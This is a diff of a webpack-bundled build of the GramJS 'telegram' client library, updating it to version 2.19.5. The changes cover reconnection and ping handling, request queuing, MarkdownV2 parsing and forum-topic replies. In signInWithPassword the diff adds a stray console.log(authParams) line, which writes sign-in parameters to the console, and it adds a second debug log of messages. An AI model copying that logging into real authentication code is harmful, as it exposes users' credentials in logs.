@@ -41759,6 +41759,7 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports._entityType = exports._EntityType = exports.TotalList = exports.crc32 = exports.bufferXor = exports.sleep = exports.getRandomInt = exports.getMinBigInt = exports.returnBigInt = exports.getByteArray = exports.modExp = exports.sha256 = exports.sha1 = exports.convertToLittle = exports.generateKeyDataFromNonce = exports.stripText = exports.generateRandomBytes = exports.bigIntMod = exports.mod = exports.generateRandomLong = exports.readBufferFromBigInt = exports.toSignedLittleBuffer = exports.isArrayLike = exports.betterConsoleLog = exports.groupBy = exports.escapeRegex = exports.generateRandomBigInt = exports.readBigIntFromBuffer = void 0;
 const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "./node_modules/big-integer/BigInteger.js"));
 const CryptoFile_1 = __importDefault(__webpack_require__(/*! ./CryptoFile */ "./node_modules/telegram/CryptoFile.js"));
+const platform_1 = __webpack_require__(/*! ./platform */ "./node_modules/telegram/platform.js");
 /**
  * converts a buffer to big int
  * @param buffer
@@ -41883,37 +41884,17 @@ function readBufferFromBigInt(bigIntVar, bytesNumber, little = true, signed = fa
         bigIntVar = bigIntVar.abs();
     }
     const hex = bigIntVar.toString(16).padStart(bytesNumber * 2, "0");
-    let littleBuffer = Buffer.from(hex, "hex");
-    if (little) {
-        littleBuffer = littleBuffer.reverse();
-    }
+    let buffer = Buffer.from(hex, "hex");
     if (signed && below) {
-        if (little) {
-            let reminder = false;
-            if (littleBuffer[0] !== 0) {
-                littleBuffer[0] -= 1;
-            }
-            for (let i = 0; i < littleBuffer.length; i++) {
-                if (littleBuffer[i] === 0) {
-                    reminder = true;
-                    continue;
-                }
-                if (reminder) {
-                    littleBuffer[i] -= 1;
-                    reminder = false;
-                }
-                littleBuffer[i] = 255 - littleBuffer[i];
-            }
-        }
-        else {
-            littleBuffer[littleBuffer.length - 1] =
-                256 - littleBuffer[littleBuffer.length - 1];
-            for (let i = 0; i < littleBuffer.length - 1; i++) {
-                littleBuffer[i] = 255 - littleBuffer[i];
-            }
+        buffer[buffer.length - 1] = 256 - buffer[buffer.length - 1];
+        for (let i = 0; i < buffer.length - 1; i++) {
+            buffer[i] = 255 - buffer[i];
         }
     }
-    return littleBuffer;
+    if (little) {
+        buffer = buffer.reverse();
+    }
+    return buffer;
 }
 exports.readBufferFromBigInt = readBufferFromBigInt;
 /**
@@ -42162,9 +42143,12 @@ exports.getRandomInt = getRandomInt;
 /**
  * Sleeps a specified amount of time
  * @param ms time in milliseconds
+ * @param isUnref make a timer unref'ed
  * @returns {Promise}
  */
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+const sleep = (ms, isUnref = false) => new Promise((resolve) => isUnref && platform_1.isNode
+    ? setTimeout(resolve, ms).unref()
+    : setTimeout(resolve, ms));
 exports.sleep = sleep;
 /**
  * Helper to export two buffers of same length
@@ -42556,6 +42540,7 @@ const tl_1 = __webpack_require__(/*! ./tl */ "./node_modules/telegram/tl/index.j
 const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "./node_modules/big-integer/BigInteger.js"));
 const mime_1 = __importDefault(__webpack_require__(/*! mime */ "./node_modules/telegram/node_modules/mime/index.js"));
 const markdown_1 = __webpack_require__(/*! ./extensions/markdown */ "./node_modules/telegram/extensions/markdown.js");
+const markdownv2_1 = __webpack_require__(/*! ./extensions/markdownv2 */ "./node_modules/telegram/extensions/markdownv2.js");
 function getFileInfo(fileLocation) {
     if (!fileLocation || !fileLocation.SUBCLASS_OF_ID) {
         _raiseCastFail(fileLocation, "InputFileLocation");
@@ -43535,6 +43520,9 @@ function sanitizeParseMode(mode) {
     if (mode === "md" || mode === "markdown") {
         return markdown_1.MarkdownParser;
     }
+    if (mode === "md2" || mode === "markdownv2") {
+        return markdownv2_1.MarkdownV2Parser;
+    }
     if (mode == "html") {
         return html_1.HTMLParser;
     }
@@ -43797,7 +43785,7 @@ export function  isListLike(item) {
 
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.version = void 0;
-exports.version = "2.15.8";
+exports.version = "2.19.5";
 
 
 /***/ }),
@@ -44247,7 +44235,7 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
      * @param inlineOnly - Whether the buttons **must** be inline buttons only or not.
      * @example
      * ```ts
-     * import {Button} from "telegram";
+     * import {Button} from "telegram/tl/custom/button";
      *  // PS this function is not async
      * const markup = client.buildReplyMarkup(Button.inline("Hello!"));
      *
@@ -44774,6 +44762,7 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
      * @return {@link Api.InputFileBig} if the file size is larger than 10mb otherwise {@link Api.InputFile}
      * @example
      * ```ts
+     * import { CustomFile } from "telegram/client/uploads";
      * const toUpload = new CustomFile("photo.jpg", fs.statSync("../photo.jpg").size, "../photo.jpg");
      * const file = await client.uploadFile({
      *  file: toUpload,
@@ -44836,7 +44825,7 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
      * Generally this should only be used when there isn't a friendly method that does what you need.<br/>
      * All available requests and types are found under the `Api.` namespace.
      * @param request - The request to send. this should be of type request.
-     * @param sender - Optional sender to use to send the requests. defaults to main sender.
+     * @param dcId - Optional dc id to use when sending.
      * @return The response from Telegram.
      * @example
      * ```ts
@@ -44848,8 +44837,11 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
      *
      * ```
      */
-    invoke(request, sender) {
-        return userMethods.invoke(this, request, sender);
+    invoke(request, dcId) {
+        return userMethods.invoke(this, request, dcId);
+    }
+    invokeWithSender(request, sender) {
+        return userMethods.invoke(this, request, undefined, sender);
     }
     /**
      * Gets the current logged in {@link Api.User}.
@@ -44958,8 +44950,9 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
     //endregion
     /** @hidden */
     async _handleReconnect() {
+        this._log.info("Handling reconnect!");
         try {
-            await this.getMe();
+            const res = await this.getMe();
         }
         catch (e) {
             this._log.error(`Error while trying to reconnect`);
@@ -44996,7 +44989,11 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
             socket: this.networkSocket,
             testServers: this.testServers,
         });
-        if (!(await this._sender.connect(connection))) {
+        if (!(await this._sender.connect(connection, false))) {
+            if (!this._loopStarted) {
+                (0, updates_1._updateLoop)(this);
+                this._loopStarted = true;
+            }
             return;
         }
         this.session.setAuthKey(this._sender.authKey);
@@ -45007,7 +45004,12 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
             layer: AllTLObjects_1.LAYER,
             query: this._initRequest,
         }));
-        (0, updates_1._updateLoop)(this);
+        if (!this._loopStarted) {
+            (0, updates_1._updateLoop)(this);
+            this._loopStarted = true;
+        }
+        this._connectedDeferred.resolve();
+        this._isSwitchingDc = false;
     }
     //endregion
     // region Working with different connections/Data Centers
@@ -45021,7 +45023,9 @@ class TelegramClient extends telegramBaseClient_1.TelegramBaseClient {
         await this._sender.authKey.setKey(undefined);
         this.session.setAuthKey(undefined);
         this.session.save();
+        this._isSwitchingDc = true;
         await this._disconnect();
+        this._sender = undefined;
         return await this.connect();
     }
     /**
@@ -45419,6 +45423,7 @@ async function sendCode(client, apiCredentials, phoneNumber, forceSMS = false) {
 exports.sendCode = sendCode;
 /** @hidden */
 async function signInWithPassword(client, apiCredentials, authParams) {
+  console.log(authParams)
     let emptyPassword = false;
     while (1) {
         try {
@@ -46003,6 +46008,7 @@ class _DialogsIter extends requestIter_1.RequestIter {
         return super[Symbol.asyncIterator]();
     }
     async _loadNextChunk() {
+        var _a;
         if (!this.request || !this.seen || !this.buffer) {
             return;
         }
@@ -46029,10 +46035,13 @@ class _DialogsIter extends requestIter_1.RequestIter {
         for (const m of r.messages) {
             let message = m;
             try {
-                // todo make sure this never fails
-                message._finishInit(this.client, entities, undefined);
+                if (message && "_finishInit" in message) {
+                    // todo make sure this never fails
+                    message._finishInit(this.client, entities, undefined);
+                }
             }
             catch (e) {
+                console.log("msg", message);
                 this.client._log.error("Got error while trying to finish init message with id " +
                     m.id);
                 if (this.client._log.canSend(Logger_1.LogLevel.ERROR)) {
@@ -46085,7 +46094,7 @@ class _DialogsIter extends requestIter_1.RequestIter {
         this.request.offsetId = lastMessage ? lastMessage.id : 0;
         this.request.offsetDate = lastMessage ? lastMessage.date : 0;
         this.request.offsetPeer =
-            this.buffer[this.buffer.length - 1].inputEntity;
+            (_a = this.buffer[this.buffer.length - 1]) === null || _a === void 0 ? void 0 : _a.inputEntity;
     }
 }
 exports._DialogsIter = _DialogsIter;
@@ -46212,7 +46221,7 @@ class DirectDownloadIter extends requestIter_1.RequestIter {
     async _request() {
         try {
             this._sender = await this.client.getSender(this._sender.dcId);
-            const result = await this.client.invoke(this.request, this._sender);
+            const result = await this.client.invokeWithSender(this.request, this._sender);
             this._timedOut = false;
             if (result instanceof tl_1.Api.upload.FileCdnRedirect) {
                 throw new Error("CDN Not supported. Please Add an issue in github");
@@ -47139,7 +47148,7 @@ class _MessagesIter extends requestIter_1.RequestIter {
                 limit: 0,
                 maxId: 0,
                 minId: 0,
-                hash: big_integer_1.default.zero,
+                hash: (0, Helpers_1.generateRandomBigInt)(),
                 fromId: fromUser,
             });
             if (!(filter instanceof tl_1.Api.InputMessagesFilterEmpty) &&
@@ -47468,7 +47477,7 @@ entity,
 /**  The message to be sent, or another message object to resend as a copy.<br/>
  * The maximum length for a message is 35,000 bytes or 4,096 characters.<br/>
  * Longer messages will not be sliced automatically, and you should slice them manually if the text to send is longer than said length. */
-{ message, replyTo, attributes, parseMode, formattingEntities, linkPreview = true, file, thumb, forceDocument, clearDraft, buttons, silent, supportStreaming, schedule, noforwards, commentTo, } = {}) {
+{ message, replyTo, attributes, parseMode, formattingEntities, linkPreview = true, file, thumb, forceDocument, clearDraft, buttons, silent, supportStreaming, schedule, noforwards, commentTo, topMsgId, } = {}) {
     if (file) {
         return client.sendFile(entity, {
             file: file,
@@ -47490,6 +47499,7 @@ entity,
             buttons: buttons,
             noforwards: noforwards,
             commentTo: commentTo,
+            topMsgId: topMsgId,
         });
     }
     entity = await client.getInputEntity(entity);
@@ -47499,6 +47509,13 @@ entity,
         replyTo = discussionData.replyTo;
     }
     let markup, request;
+    let replyObject = undefined;
+    if (replyTo != undefined) {
+        replyObject = new tl_1.Api.InputReplyToMessage({
+            replyToMsgId: (0, Utils_1.getMessageId)(replyTo),
+            topMsgId: (0, Utils_1.getMessageId)(topMsgId),
+        });
+    }
     if (message && message instanceof tl_1.Api.Message) {
         if (buttons == undefined) {
             markup = message.replyMarkup;
@@ -47525,7 +47542,7 @@ entity,
             peer: entity,
             message: message.message || "",
             silent: silent,
-            replyToMsgId: (0, Utils_1.getMessageId)(replyTo),
+            replyTo: replyObject,
             replyMarkup: markup,
             entities: message.entities,
             clearDraft: clearDraft,
@@ -47547,7 +47564,7 @@ entity,
             message: message.toString(),
             entities: formattingEntities,
             noWebpage: !linkPreview,
-            replyToMsgId: (0, Utils_1.getMessageId)(replyTo),
+            replyTo: replyObject,
             clearDraft: clearDraft,
             silent: silent,
             replyMarkup: client.buildReplyMarkup(buttons),
@@ -47912,6 +47929,7 @@ const TCPMTProxy_1 = __webpack_require__(/*! ../network/connection/TCPMTProxy */
 const async_mutex_1 = __webpack_require__(/*! async-mutex */ "./node_modules/async-mutex/lib/index.js");
 const Logger_1 = __webpack_require__(/*! ../extensions/Logger */ "./node_modules/telegram/extensions/Logger.js");
 const platform_1 = __webpack_require__(/*! ../platform */ "./node_modules/telegram/platform.js");
+const Deferred_1 = __importDefault(__webpack_require__(/*! ../extensions/Deferred */ "./node_modules/telegram/extensions/Deferred.js"));
 const EXPORTED_SENDER_RECONNECT_TIMEOUT = 1000; // 1 sec
 const EXPORTED_SENDER_RELEASE_TIMEOUT = 30000; // 30 sec
 const DEFAULT_DC_ID = 4;
@@ -48019,6 +48037,8 @@ class TelegramBaseClient {
         this._loopStarted = false;
         this._reconnecting = false;
         this._destroyed = false;
+        this._isSwitchingDc = false;
+        this._connectedDeferred = new Deferred_1.default();
         // parse mode
         this._parseMode = markdown_1.MarkdownParser;
     }
@@ -48047,17 +48067,25 @@ class TelegramBaseClient {
     }
     async disconnect() {
         await this._disconnect();
-        await Promise.all(Object.values(this._exportedSenderPromises).map((promise) => {
-            return (promise &&
-                promise.then((sender) => {
-                    if (sender) {
-                        return sender.disconnect();
-                    }
-                    return undefined;
-                }));
-        }));
-        this._exportedSenderPromises = new Map();
-        // TODO cancel hanging promises
+        await Promise.all(Object.values(this._exportedSenderPromises)
+            .map((promises) => {
+            return Object.values(promises).map((promise) => {
+                return (promise &&
+                    promise.then((sender) => {
+                        if (sender) {
+                            return sender.disconnect();
+                        }
+                        return undefined;
+                    }));
+            });
+        })
+            .flat());
+        Object.values(this._exportedSenderReleaseTimeouts).forEach((timeouts) => {
+            Object.values(timeouts).forEach((releaseTimeout) => {
+                clearTimeout(releaseTimeout);
+            });
+        });
+        this._exportedSenderPromises.clear();
     }
     get disconnected() {
         return !this._sender || this._sender._disconnected;
@@ -48108,7 +48136,7 @@ class TelegramBaseClient {
                     proxy: this._proxy,
                     testServers: this.testServers,
                     socket: this.networkSocket,
-                }));
+                }), false);
                 if (this.session.dcId !== dcId && !sender._authenticated) {
                     this._log.info(`Exporting authorization for data center ${dc.ipAddress} with layer ${AllTLObjects_1.LAYER}`);
                     const auth = await this.invoke(new tl_1.Api.auth.ExportAuthorization({ dcId: dcId }));
@@ -48220,25 +48248,28 @@ exports.TelegramBaseClient = TelegramBaseClient;
 /*!*************************************************!*\
   !*** ./node_modules/telegram/client/updates.js ***!
   \*************************************************/
-/***/ (function(__unused_webpack_module, exports, __webpack_require__) {
+/***/ ((__unused_webpack_module, exports, __webpack_require__) => {
 
 "use strict";
 
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports._updateLoop = exports._dispatchUpdate = exports._processUpdate = exports._handleUpdate = exports.catchUp = exports.listEventHandlers = exports.removeEventHandler = exports.addEventHandler = exports.on = exports.StopPropagation = void 0;
 const tl_1 = __webpack_require__(/*! ../tl */ "./node_modules/telegram/tl/index.js");
-const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "./node_modules/big-integer/BigInteger.js"));
 const network_1 = __webpack_require__(/*! ../network */ "./node_modules/telegram/network/index.js");
 const index_1 = __webpack_require__(/*! ../index */ "./node_modules/telegram/index.js");
 const Helpers_1 = __webpack_require__(/*! ../Helpers */ "./node_modules/telegram/Helpers.js");
+const Logger_1 = __webpack_require__(/*! ../extensions/Logger */ "./node_modules/telegram/extensions/Logger.js");
 const PING_INTERVAL = 9000; // 9 sec
 const PING_TIMEOUT = 10000; // 10 sec
 const PING_FAIL_ATTEMPTS = 3;
 const PING_FAIL_INTERVAL = 100; // ms
 const PING_DISCONNECT_DELAY = 60000; // 1 min
+// An unusually long interval is a sign of returning from background mode...
+const PING_INTERVAL_TO_WAKE_UP = 5000; // 5 sec
+// ... so we send a quick "wake-up" ping to confirm than connection was dropped ASAP
+const PING_WAKE_UP_TIMEOUT = 3000; // 3 sec
+// We also send a warning to the user even a bit more quickly
+const PING_WAKE_UP_WARNING_TIMEOUT = 1000; // 1 sec
 /**
  If this exception is raised in any of the handlers for a given event,
  it will stop the execution of all other registered event handlers.
@@ -48369,7 +48400,9 @@ async function _dispatchUpdate(client, args) {
                     if (e instanceof StopPropagation) {
                         break;
                     }
-                    console.error(e);
+                    if (client._log.canSend(Logger_1.LogLevel.ERROR)) {
+                        console.error(e);
+                    }
                 }
             }
         }
@@ -48378,31 +48411,66 @@ async function _dispatchUpdate(client, args) {
 exports._dispatchUpdate = _dispatchUpdate;
 /** @hidden */
 async function _updateLoop(client) {
-    var _a;
-    while (client.connected) {
+    let lastPongAt;
+    while (!client._destroyed) {
+        await (0, Helpers_1.sleep)(PING_INTERVAL, true);
+        if (client._destroyed)
+            break;
+        if (client._sender.isReconnecting || client._isSwitchingDc) {
+            lastPongAt = undefined;
+            continue;
+        }
         try {
-            await (0, Helpers_1.sleep)(60 * 1000);
-            if (!((_a = client._sender) === null || _a === void 0 ? void 0 : _a._transportConnected())) {
+            const ping = () => {
+                return client._sender.send(new tl_1.Api.PingDelayDisconnect({
+                    pingId: (0, Helpers_1.returnBigInt)((0, Helpers_1.getRandomInt)(Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER)),
+                    disconnectDelay: PING_DISCONNECT_DELAY,
+                }));
+            };
+            const pingAt = Date.now();
+            const lastInterval = lastPongAt ? pingAt - lastPongAt : undefined;
+            if (!lastInterval || lastInterval < PING_INTERVAL_TO_WAKE_UP) {
+                await attempts(() => timeout(ping, PING_TIMEOUT), PING_FAIL_ATTEMPTS, PING_FAIL_INTERVAL);
+            }
+            else {
+                let wakeUpWarningTimeout = setTimeout(() => {
+                    _handleUpdate(client, network_1.UpdateConnectionState.disconnected);
+                    wakeUpWarningTimeout = undefined;
+                }, PING_WAKE_UP_WARNING_TIMEOUT);
+                await timeout(ping, PING_WAKE_UP_TIMEOUT);
+                if (wakeUpWarningTimeout) {
+                    clearTimeout(wakeUpWarningTimeout);
+                    wakeUpWarningTimeout = undefined;
+                }
+                _handleUpdate(client, network_1.UpdateConnectionState.connected);
+            }
+            lastPongAt = Date.now();
+        }
+        catch (err) {
+            // eslint-disable-next-line no-console
+            if (client._log.canSend(Logger_1.LogLevel.ERROR)) {
+                console.error(err);
+            }
+            lastPongAt = undefined;
+            if (client._sender.isReconnecting || client._isSwitchingDc) {
                 continue;
             }
-            await client.invoke(new tl_1.Api.Ping({
-                pingId: (0, big_integer_1.default)((0, Helpers_1.getRandomInt)(Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER)),
-            }));
+            client._sender.reconnect();
         }
-        catch (e) {
-            return;
-        }
-        client.session.save();
-        if (new Date().getTime() - (client._lastRequest || 0) >
-            30 * 60 * 1000) {
+        // We need to send some content-related request at least hourly
+        // for Telegram to keep delivering updates, otherwise they will
+        // just stop even if we're connected. Do so every 30 minutes.
+        if (Date.now() - (client._lastRequest || 0) > 30 * 60 * 1000) {
             try {
                 await client.invoke(new tl_1.Api.updates.GetState());
             }
             catch (e) {
                 // we don't care about errors here
             }
+            lastPongAt = undefined;
         }
     }
+    await client.disconnect();
 }
 exports._updateLoop = _updateLoop;
 /** @hidden */
@@ -48422,11 +48490,14 @@ async function attempts(cb, times, pause) {
     return undefined;
 }
 /** @hidden */
-function timeout(promise, ms) {
+function timeout(cb, ms) {
+    let isResolved = false;
     return Promise.race([
-        promise,
-        (0, Helpers_1.sleep)(ms).then(() => Promise.reject(new Error("TIMEOUT"))),
-    ]);
+        cb(),
+        (0, Helpers_1.sleep)(ms).then(() => isResolved ? undefined : Promise.reject(new Error("TIMEOUT"))),
+    ]).finally(() => {
+        isResolved = true;
+    });
 }
 
 
@@ -48749,7 +48820,7 @@ async function _fileToMedia(client, { file, forceDocument, fileSize, progressCal
 }
 exports._fileToMedia = _fileToMedia;
 /** @hidden */
-async function _sendAlbum(client, entity, { file, caption, forceDocument = false, fileSize, clearDraft = false, progressCallback, replyTo, attributes, thumb, parseMode, voiceNote = false, videoNote = false, silent, supportsStreaming = false, scheduleDate, workers = 1, noforwards, commentTo, }) {
+async function _sendAlbum(client, entity, { file, caption, forceDocument = false, fileSize, clearDraft = false, progressCallback, replyTo, attributes, thumb, parseMode, voiceNote = false, videoNote = false, silent, supportsStreaming = false, scheduleDate, workers = 1, noforwards, commentTo, topMsgId, }) {
     entity = await client.getInputEntity(entity);
     let files = [];
     if (!Array.isArray(file)) {
@@ -48776,6 +48847,10 @@ async function _sendAlbum(client, entity, { file, caption, forceDocument = false
     else {
         replyTo = index_1.utils.getMessageId(replyTo);
     }
+    if (!attributes) {
+        attributes = [];
+    }
+    let index = 0;
     const albumFiles = [];
     for (const file of files) {
         let { fileHandle, media, image } = await _fileToMedia(client, {
@@ -48783,13 +48858,15 @@ async function _sendAlbum(client, entity, { file, caption, forceDocument = false
             forceDocument: forceDocument,
             fileSize: fileSize,
             progressCallback: progressCallback,
-            attributes: attributes,
+            // @ts-ignore
+            attributes: attributes[index],
             thumb: thumb,
             voiceNote: voiceNote,
             videoNote: videoNote,
             supportsStreaming: supportsStreaming,
             workers: workers,
         });
+        index++;
         if (media instanceof tl_1.Api.InputMediaUploadedPhoto ||
             media instanceof tl_1.Api.InputMediaPhotoExternal) {
             const r = await client.invoke(new tl_1.Api.messages.UploadMedia({
@@ -48820,9 +48897,16 @@ async function _sendAlbum(client, entity, { file, caption, forceDocument = false
             entities: msgEntities,
         }));
     }
+    let replyObject = undefined;
+    if (replyTo != undefined) {
+        replyObject = new tl_1.Api.InputReplyToMessage({
+            replyToMsgId: (0, Utils_1.getMessageId)(replyTo),
+            topMsgId: (0, Utils_1.getMessageId)(topMsgId),
+        });
+    }
     const result = await client.invoke(new tl_1.Api.messages.SendMultiMedia({
         peer: entity,
-        replyToMsgId: replyTo,
+        replyTo: replyObject,
         multiMedia: albumFiles,
         silent: silent,
         scheduleDate: scheduleDate,
@@ -48834,7 +48918,7 @@ async function _sendAlbum(client, entity, { file, caption, forceDocument = false
 }
 exports._sendAlbum = _sendAlbum;
 /** @hidden */
-async function sendFile(client, entity, { file, caption, forceDocument = false, fileSize, clearDraft = false, progressCallback, replyTo, attributes, thumb, parseMode, formattingEntities, voiceNote = false, videoNote = false, buttons, silent, supportsStreaming = false, scheduleDate, workers = 1, noforwards, commentTo, }) {
+async function sendFile(client, entity, { file, caption, forceDocument = false, fileSize, clearDraft = false, progressCallback, replyTo, attributes, thumb, parseMode, formattingEntities, voiceNote = false, videoNote = false, buttons, silent, supportsStreaming = false, scheduleDate, workers = 1, noforwards, commentTo, topMsgId, }) {
     if (!file) {
         throw new Error("You need to specify a file");
     }
@@ -48856,12 +48940,14 @@ async function sendFile(client, entity, { file, caption, forceDocument = false, 
             caption: caption,
             replyTo: replyTo,
             parseMode: parseMode,
+            attributes: attributes,
             silent: silent,
             scheduleDate: scheduleDate,
             supportsStreaming: supportsStreaming,
             clearDraft: clearDraft,
             forceDocument: forceDocument,
             noforwards: noforwards,
+            topMsgId: topMsgId,
         });
     }
     if (Array.isArray(caption)) {
@@ -48879,6 +48965,7 @@ async function sendFile(client, entity, { file, caption, forceDocument = false, 
         forceDocument: forceDocument,
         fileSize: fileSize,
         progressCallback: progressCallback,
+        // @ts-ignore
         attributes: attributes,
         thumb: thumb,
         voiceNote: voiceNote,
@@ -48890,10 +48977,17 @@ async function sendFile(client, entity, { file, caption, forceDocument = false, 
         throw new Error(`Cannot use ${file} as file.`);
     }
     const markup = client.buildReplyMarkup(buttons);
+    let replyObject = undefined;
+    if (replyTo != undefined) {
+        replyObject = new tl_1.Api.InputReplyToMessage({
+            replyToMsgId: (0, Utils_1.getMessageId)(replyTo),
+            topMsgId: (0, Utils_1.getMessageId)(topMsgId),
+        });
+    }
     const request = new tl_1.Api.messages.SendMedia({
         peer: entity,
         media: media,
-        replyToMsgId: replyTo,
+        replyTo: replyObject,
         message: caption,
         entities: msgEntities,
         replyMarkup: markup,
@@ -48945,26 +49039,34 @@ const Helpers_1 = __webpack_require__(/*! ../Helpers */ "./node_modules/telegram
 const __1 = __webpack_require__(/*! ../ */ "./node_modules/telegram/index.js");
 const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "./node_modules/big-integer/BigInteger.js"));
 const Logger_1 = __webpack_require__(/*! ../extensions/Logger */ "./node_modules/telegram/extensions/Logger.js");
+const RequestState_1 = __webpack_require__(/*! ../network/RequestState */ "./node_modules/telegram/network/RequestState.js");
 // UserMethods {
 // region Invoking Telegram request
 /** @hidden */
-async function invoke(client, request, sender) {
+async function invoke(client, request, dcId, otherSender) {
     if (request.classType !== "request") {
         throw new Error("You can only invoke MTProtoRequests");
     }
-    if (!sender) {
-        sender = client._sender;
+    let sender = client._sender;
+    if (dcId) {
+        sender = await client.getSender(dcId);
+    }
+    if (otherSender != undefined) {
+        sender = otherSender;
     }
     if (sender == undefined) {
         throw new Error("Cannot send requests while disconnected. You need to call .connect()");
     }
+    await client._connectedDeferred.promise;
     await request.resolve(client, __1.utils);
     client._lastRequest = new Date().getTime();
-    let attempt;
+    const state = new RequestState_1.RequestState(request);
+    let attempt = 0;
     for (attempt = 0; attempt < client._requestRetries; attempt++) {
+        sender.addStateToQueue(state);
         try {
-            const promise = sender.send(request);
-            const result = await promise;
+            const result = await state.promise;
+            state.finished.resolve();
             client.session.processEntities(result);
             client._entityCache.add(result);
             return result;
@@ -48983,6 +49085,7 @@ async function invoke(client, request, sender) {
                     await (0, Helpers_1.sleep)(e.seconds * 1000);
                 }
                 else {
+                    state.finished.resolve();
                     throw e;
                 }
             }
@@ -48993,14 +49096,31 @@ async function invoke(client, request, sender) {
                 const shouldRaise = e instanceof __1.errors.PhoneMigrateError ||
                     e instanceof __1.errors.NetworkMigrateError;
                 if (shouldRaise && (await client.isUserAuthorized())) {
+                    state.finished.resolve();
                     throw e;
                 }
                 await client._switchDC(e.newDc);
+                sender =
+                    dcId === undefined
+                        ? client._sender
+                        : await client.getSender(dcId);
+            }
+            else if (e instanceof __1.errors.MsgWaitError) {
+                // We need to resend this after the old one was confirmed.
+                await state.isReady();
+                state.after = undefined;
+            }
+            else if (e.message === "CONNECTION_NOT_INITED") {
+                await client.disconnect();
+                await (0, Helpers_1.sleep)(2000);
+                await client.connect();
             }
             else {
+                state.finished.resolve();
                 throw e;
             }
         }
+        state.resetPromise();
     }
     throw new Error(`Request was unsuccessful ${attempt} time(s)`);
 }
@@ -51254,16 +51374,43 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.BinaryWriter = void 0;
 class BinaryWriter {
     constructor(stream) {
-        this._stream = stream;
+        this._buffers = [stream];
     }
     write(buffer) {
-        this._stream = Buffer.concat([this._stream, buffer]);
+        this._buffers.push(buffer);
     }
     getValue() {
-        return this._stream;
+        return Buffer.concat(this._buffers);
     }
 }
 exports.BinaryWriter = BinaryWriter;
+
+
+/***/ }),
+
+/***/ "./node_modules/telegram/extensions/Deferred.js":
+/*!******************************************************!*\
+  !*** ./node_modules/telegram/extensions/Deferred.js ***!
+  \******************************************************/
+/***/ ((__unused_webpack_module, exports) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+class Deferred {
+    constructor() {
+        this.promise = new Promise((resolve, reject) => {
+            this.reject = reject;
+            this.resolve = resolve;
+        });
+    }
+    static resolved(value) {
+        const deferred = new Deferred();
+        deferred.resolve(value);
+        return deferred;
+    }
+}
+exports["default"] = Deferred;
 
 
 /***/ }),
@@ -51419,6 +51566,13 @@ exports.MessagePacker = void 0;
 const core_1 = __webpack_require__(/*! ../tl/core */ "./node_modules/telegram/tl/core/index.js");
 const core_2 = __webpack_require__(/*! ../tl/core */ "./node_modules/telegram/tl/core/index.js");
 const BinaryWriter_1 = __webpack_require__(/*! ./BinaryWriter */ "./node_modules/telegram/extensions/BinaryWriter.js");
+const USE_INVOKE_AFTER_WITH = new Set([
+    "messages.SendMessage",
+    "messages.SendMedia",
+    "messages.SendMultiMedia",
+    "messages.ForwardMessages",
+    "messages.SendInlineBotResult",
+]);
 class MessagePacker {
     constructor(state, logger) {
         this._state = state;
@@ -51432,23 +51586,81 @@ class MessagePacker {
     values() {
         return this._queue;
     }
-    append(state) {
-        this._queue.push(state);
+    append(state, setReady = true, atStart = false) {
+        var _a, _b;
+        // We need to check if there is already a `USE_INVOKE_AFTER_WITH` request
+        if (state && USE_INVOKE_AFTER_WITH.has(state.request.className)) {
+            if (atStart) {
+                // Assign `after` for the previously first `USE_INVOKE_AFTER_WITH` request
+                for (let i = 0; i < this._queue.length; i++) {
+                    if (USE_INVOKE_AFTER_WITH.has((_a = this._queue[i]) === null || _a === void 0 ? void 0 : _a.request.className)) {
+                        this._queue[i].after = state;
+                        break;
+                    }
+                }
+            }
+            else {
+                // Assign after for the previous `USE_INVOKE_AFTER_WITH` request
+                for (let i = this._queue.length - 1; i >= 0; i--) {
+                    if (USE_INVOKE_AFTER_WITH.has((_b = this._queue[i]) === null || _b === void 0 ? void 0 : _b.request.className)) {
+                        state.after = this._queue[i];
+                        break;
+                    }
+                }
+            }
+        }
+        if (atStart) {
+            this._queue.unshift(state);
+        }
+        else {
+            this._queue.push(state);
+        }
+        if (setReady && this.setReady) {
+            this.setReady(true);
+        }
+        // 1658238041=MsgsAck, we don't care about MsgsAck here because they never resolve anyway.
+        if (state && state.request.CONSTRUCTOR_ID !== 1658238041) {
+            this._pendingStates.push(state);
+            state
+                .promise // Using finally causes triggering `unhandledrejection` event
+                .catch(() => { })
+                .finally(() => {
+                this._pendingStates = this._pendingStates.filter((s) => s !== state);
+            });
+        }
+    }
+    prepend(states) {
+        states.reverse().forEach((state) => {
+            this.append(state, false, true);
+        });
         if (this.setReady) {
             this.setReady(true);
         }
     }
     extend(states) {
-        for (const state of states) {
-            this.append(state);
+        states.forEach((state) => {
+            this.append(state, false);
+        });
+        if (this.setReady) {
+            this.setReady(true);
         }
     }
-    async get() {
+    clear() {
+        this._queue = [];
+        this.append(undefined);
+    }
+    async wait() {
         if (!this._queue.length) {
             this._ready = new Promise((resolve) => {
                 this.setReady = resolve;
             });
             await this._ready;
+        }
+    }
+    async get() {
+        if (!this._queue[this._queue.length - 1]) {
+            this._queue = this._queue.filter(Boolean);
+            return undefined;
         }
         let data;
         let buffer = new BinaryWriter_1.BinaryWriter(Buffer.alloc(0));
@@ -51457,9 +51669,15 @@ class MessagePacker {
         while (this._queue.length &&
             batch.length <= core_1.MessageContainer.MAXIMUM_LENGTH) {
             const state = this._queue.shift();
+            if (!state) {
+                continue;
+            }
